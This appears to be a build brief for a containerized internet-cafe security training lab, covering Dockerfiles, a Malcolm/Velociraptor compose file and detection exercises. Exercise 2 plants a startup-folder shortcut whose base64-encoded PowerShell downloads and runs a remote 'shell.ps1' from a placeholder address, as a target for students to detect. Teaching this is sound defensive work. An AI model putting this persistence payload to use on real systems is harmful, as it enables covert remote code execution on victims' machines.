# Containerized Internet Cafe Security Lab - Build Prompt

## Objective
Build a lightweight, containerized training lab demonstrating internet cafe security architecture using Windows Nanoserver Docker images. The lab must simulate the production environment described: VLAN-segmented public terminals, staff operations, relief ops mode, and security monitoring stack.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    DOCKER HOST (Linux)                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐    │
│  │   VLAN 10   │  │   VLAN 20   │  │      VLAN 30        │    │
│  │  STAFF/OPS  │  │   PUBLIC    │  │    RELIEF OPS       │    │
│  │             │  │  TERMINALS  │  │   (time-limited)    │    │
│  │ Nanoserver  │  │  Nanoserver │  │   Nanoserver        │    │
│  │  + DC role  │  │  + Browser  │  │   + Elevated        │    │
│  │  (simulated)│  │  + Sysmon   │  │     Access          │    │
│  └──────┬──────┘  └──────┬──────┘  └──────────┬──────────┘    │
│         │                │                    │                │
│         └────────────────┴────────────────────┘                │
│                          │                                      │
│                   ┌──────┴──────┐                               │
│                   │   MALCOLM   │                               │
│                   │  (Arkime +  │                               │
│                   │   Zeek +    │                               │
│                   │  OpenSearch)│                               │
│                   └─────────────┘                               │
│                          ▲                                      │
│                   ┌──────┴──────┐                               │
│                   │ VELOCIRAPTOR│                               │
│                   │   SERVER    │                               │
│                   │  (mTLS mgmt)│                               │
│                   └─────────────┘                               │
└─────────────────────────────────────────────────────────────────┘
```

## Container Specifications

### Base Image Requirements
- **Primary**: `mcr.microsoft.com/windows/nanoserver:ltsc2022` (or latest)
- **Fallback for DC simulation**: `mcr.microsoft.com/windows/servercore:ltsc2022` (for AD DS features Nanoserver lacks)
- **Linux containers**: Standard images for Malcolm, Velociraptor server, networking tools

### Container 1: Public Terminal (VLAN 20)
```dockerfile
FROM mcr.microsoft.com/windows/nanoserver:ltsc2022

# Install minimal browser (Edge WebView2 runtime for kiosk mode simulation)
# Note: Nanoserver has limited Win32 support - use WebView2 or simulate browser behavior

# Install Sysmon (requires Server Core or Windows container with more APIs)
# Alternative: Use auditd-equivalent or simulate with PowerShell logging

# Configure kiosk mode via registry
RUN reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnloadDLL" /t REG_DWORD /d 1 /f

# Entry point: simulated user session
CMD ["powershell", "-Command", "while($true){ Start-Sleep 60; Write-Host 'Public terminal idle...' }"]
```

**Note**: Nanoserver has significant limitations for this use case. Consider `servercore` for full Sysmon/browser simulation, or use **Linux containers** to simulate Windows endpoints with tools like `samba` + `sysmon-for-linux` (if available) or equivalent audit frameworks.

### Container 2: Staff/DC Simulation (VLAN 10)
```dockerfile
FROM mcr.microsoft.com/windows/servercore:ltsc2022

# Install AD DS features (for simulation only - real DC needs full Windows Server)
RUN powershell -Command "Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools"

# Configure smartcard simulation (cert-based auth)
RUN echo "Smartcard auth simulated via certificate mapping"

# Hardening: Disable unnecessary services
RUN powershell -Command "Get-Service | Where-Object {$_.Name -match 'Spooler|Fax|WMPNetworkSvc'} | Stop-Service; Set-Service -StartupType Disabled"

EXPOSE 53 88 135 139 445 464 636 3268 3269

CMD ["powershell", "-Command", "while($true){ Start-Sleep 60 }"]
```

### Container 3: Malcolm Stack (Linux)
```yaml
# docker-compose.yml snippet for Malcolm
version: '3.8'

services:
  malcolm:
    image: ghcr.io/cisagov/malcolm:latest
    container_name: malcolm
    hostname: malcolm
    restart: unless-stopped
    environment:
      - MALCOLM_PROFILE=malcolm
      - NGINX_BASIC_AUTH=true
      - NGINX_SSL=true
    volumes:
      - ./malcolm-data:/data
      - ./pcap:/pcap
    ports:
      - "443:443"      # OpenSearch Dashboards
      - "8005:8005"    # Arkime
      - "9200:9200"    # OpenSearch API
    networks:
      - cafe-security
    cap_add:
      - NET_ADMIN      # For packet capture

  velociraptor-server:
    image: ghcr.io/velocidex/velociraptor:latest
    container_name: velociraptor-server
    hostname: velociraptor
    restart: unless-stopped
    environment:
      - VELOCIRAPTOR_CONFIG=/etc/velociraptor/server.config.yaml
    volumes:
      - ./velociraptor-data:/data
      - ./velociraptor-config:/etc/velociraptor
    ports:
      - "8000:8000"    # Velociraptor frontend
      - "8889:8889"    # GUI
    networks:
      - cafe-security

networks:
  cafe-security:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
```

## Lab Exercises to Include

### Exercise 1: Network Segmentation Verification
```bash
# From public terminal container
ping 10.10.0.5    # Should fail (staff VLAN)
ping 8.8.8.8      # Should succeed (internet only)

# Verify no lateral movement possible
nmap -sn 10.10.0.0/24  # Should show no hosts
```

### Exercise 2: Persistence Detection
```powershell
# Simulate LNK persistence attack
# Create malicious .lnk in startup folder
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($lnkPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="
$shortcut.Save()

# Student task: Detect this with Sysmon Event ID 11 (file create) and Velociraptor
```

### Exercise 3: Containment Drill
```powershell
# Trigger containment from Velociraptor
# Verify: Can still reach VR server? Yes
# Verify: Can reach internet? No
# Verify: Can reach staff VLAN? No

# Decontain and verify restoration
```

### Exercise 4: Malcolm Analysis
```bash
# Arkime: Search for suspicious JA3 fingerprint
# Zeek: Analyze DNS queries for DGA patterns
# Suricata: Review alert for ET POLICY Cryptocurrency Miner Checkin
```

## Presentation Flow (45-60 minutes)

1. **Threat Model** (5 min): Who attacks public terminals and why
2. **Architecture** (10 min): VLAN segmentation, reboot-to-restore, thawed zones
3. **Live Demo** (15 min): 
   - Show Velociraptor hunt for LNK files
   - Trigger Sysmon alert for suspicious parent/child process
   - Demonstrate containment script execution
4. **Forensics Deep Dive** (10 min): Malcolm dashboard, Arkime session reconstruction
5. **Playbook Walkthrough** (10 min): PB-01 (compromised terminal) step-by-step
6. **Q&A** (5-10 min)

## Technical Requirements for Lab Host

- **OS**: Windows 10/11 Pro or Enterprise with Hyper-V, OR Linux with Docker CE
- **RAM**: 32GB minimum (64GB recommended)
- **Storage**: 200GB free (Malcolm + container layers)
- **Network**: Ability to create internal NAT switches (Hyper-V) or Docker networks
- **Software**: Docker Desktop (Windows) or Docker CE (Linux), Git, PowerShell 7+

## Container Build Commands

```bash
# Clone lab repository
git clone https://github.com/yourorg/cafe-security-lab.git
cd cafe-security-lab

# Build Windows containers (run on Windows host with Docker Desktop)
docker build -t cafe-lab:public-terminal -f docker/Dockerfile.public .
docker build -t cafe-lab:staff-dc -f docker/Dockerfile.staff .

# Build Linux stack
docker-compose -f docker-compose.malcolm.yml build

# Start full lab
docker-compose up -d

# Verify segmentation
docker exec -it cafe-public-terminal ping cafe-staff-dc  # Should fail
docker exec -it cafe-public-terminal ping 8.8.8.8       # Should succeed
```

## Deliverables Checklist

- [ ] Working containerized lab with 3+ VLAN segments
- [ ] Sysmon generating events visible in Malcolm/OpenSearch
- [ ] Velociraptor server with at least one enrolled client
- [ ] Containment scripts tested and functional
- [ ] LNK persistence attack simulation working
- [ ] 45-60 minute presentation deck with live demo flow
- [ ] Student lab guide with exercises 1-4
- [ ] Troubleshooting guide for common container issues

---

**Estimated build time**: 8-12 hours for experienced Docker user, 16-20 hours for novice
**Maintenance**: Monthly image updates, quarterly exercise refresh
